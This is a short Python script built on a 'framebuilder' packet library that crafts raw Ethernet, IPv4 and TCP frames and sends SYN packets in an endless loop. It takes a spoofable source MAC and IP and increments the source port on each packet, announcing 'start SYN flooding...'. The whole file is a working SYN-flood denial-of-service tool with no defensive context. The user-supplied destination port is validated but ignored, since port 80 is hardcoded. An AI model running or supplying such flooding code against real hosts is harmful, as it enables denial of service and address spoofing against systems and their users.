#!/usr/bin/env python3

import sys
from framebuilder import tools, eth, ipv4, tcp

if len(sys.argv) < 5:
    print('Missing arguments')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

if not tools.is_valid_ipv4_address(sys.argv[2]):
    print('Invalid source IP address')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

if not tools.is_valid_ipv4_address(sys.argv[3]):
    print('Invalid destination IP address')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

if not tools.is_valid_mac_address(sys.argv[1]):
    print('Invalid source MAC address')
    print(f'Usage: {sys.argv[0]} src_mac src_ip dst_ip dst_port')
    sys.exit(1)

src_mac = sys.argv[1]
src_ip = sys.argv[2]
dst_ip = sys.argv[3]
dst_port = 0
try:
    dst_port = int(sys.argv[4])
except ValueError as e:
    print('Invalid port number')
    print(e)
    sys.exit(1)

if dst_port > 65535:
    print('Invalid port number')
    sys.exit(1)

if_name = tools.get_route_if_name(dst_ip)
socket = tools.create_socket(if_name)

packet = ipv4.IPv4Packet()
packet.src_addr = src_ip
packet.dst_addr = dst_ip
packet.ttl = 64
packet.protocol = 6
packet.identification = 12345
packet.flags=2

segment = tcp.TCPSegment()
segment.dst_port = 80
segment.seq_nr = 1234567
segment.window = 65535
segment.syn = 1

frame = eth.Frame()
frame.src_addr = src_mac
frame.dst_addr = tools.get_mac_for_dst_ip(dst_ip)
frame.ether_type = 0x0800

src_port = 0
count = 0
tools.print_rgb('start SYN flooding...', rgb=(200, 0, 0), bold=True)
try:
    while True:
        src_port = (src_port + 1) & 0xffff
        segment.src_port = src_port
        segment.encapsulate(packet)
        frame.payload = packet.get_bytes()
        frame.send(socket)
        count += 1
        info = f'\rport: {src_port} packets sent: {count:20}'
        tools.print_rgb(info, rgb=(200, 200, 200), bold=True, end='')
except KeyboardInterrupt:
    tools.print_rgb('\nstopped; Goodbye!', rgb=(0, 200, 0), bold=True)
